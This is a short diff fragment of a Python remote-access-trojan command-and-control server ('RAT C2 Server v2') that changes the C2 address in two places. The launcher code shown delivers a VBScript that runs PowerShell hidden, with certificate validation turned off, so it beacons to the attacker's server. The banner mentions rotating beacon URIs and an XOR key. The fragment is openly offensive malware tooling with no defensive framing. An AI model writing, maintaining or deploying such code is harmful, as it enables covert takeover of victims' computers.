@@ -226,7 +226,7 @@ def serve_launcher():
     .vbs → wscript.exe → nessuna finestra console visibile (a differenza di .bat).
     Lancia PowerShell completamente nascosto (windowStyle=0).
     """
-    c2 = "https://192.168.42.124:443"
+    c2 = "https://192.168.122.47:443"
     ps_cmd = (
         "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
@@ -549,7 +549,7 @@ if __name__ == '__main__':
 
     print(f"\n{'='*60}")
     print(f"  RAT C2 Server v2")
-    print(f"  Dashboard: https://192.168.42.124/")
+    print(f"  Dashboard: https://192.168.122.47/")
     print(f"  Beacon URI pool: {len(BEACON_URIS)} endpoints")
     print(f"  Result URI pool: {len(RESULT_URIS)} endpoints")
     print(f"  XOR Key: {XOR_KEY.hex()[:16]}...")
